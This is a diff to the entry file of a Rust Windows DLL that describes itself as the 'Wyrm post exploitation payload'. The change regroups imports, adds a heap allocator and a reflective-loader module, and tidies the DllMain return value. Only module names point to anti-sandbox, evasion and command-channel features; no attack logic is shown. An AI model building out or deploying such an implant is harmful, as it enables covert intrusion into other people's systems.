@@ -3,9 +3,15 @@
 #![feature(const_option_ops)]
 #![feature(const_trait_impl)]
 
-use windows_sys::Win32::{Foundation::HINSTANCE, System::SystemServices::DLL_PROCESS_ATTACH};
+use windows_sys::Win32::{
+    Foundation::{HINSTANCE, TRUE},
+    System::SystemServices::DLL_PROCESS_ATTACH,
+};
 
-use crate::utils::export_comptime::{StartType, internal_dll_start};
+use crate::utils::{
+    allocate::ProcessHeapAlloc,
+    export_comptime::{StartType, internal_dll_start},
+};
 
 mod anti_sandbox;
 mod comms;
@@ -13,11 +19,13 @@ mod entry;
 mod evasion;
 mod execute;
 mod native;
+mod rdi_loader;
 mod utils;
 mod wyrm;
 
-/// DLLMain acts as the entrypoint for the Wyrm post exploitation payload. The DLL sets a global atomic to track the thread ID, which
-/// on exit, allows the thread to
+#[global_allocator]
+static GLOBAL_ALLOC: ProcessHeapAlloc = ProcessHeapAlloc;
+
 #[unsafe(no_mangle)]
 #[allow(non_snake_case)]
 unsafe extern "system" fn DllMain(_hmod_instance: HINSTANCE, dw_reason: u32, _: usize) -> i32 {
@@ -26,5 +34,5 @@ unsafe extern "system" fn DllMain(_hmod_instance: HINSTANCE, dw_reason: u32, _: 
         _ => (),
     }
 
-    1
+    TRUE
 }
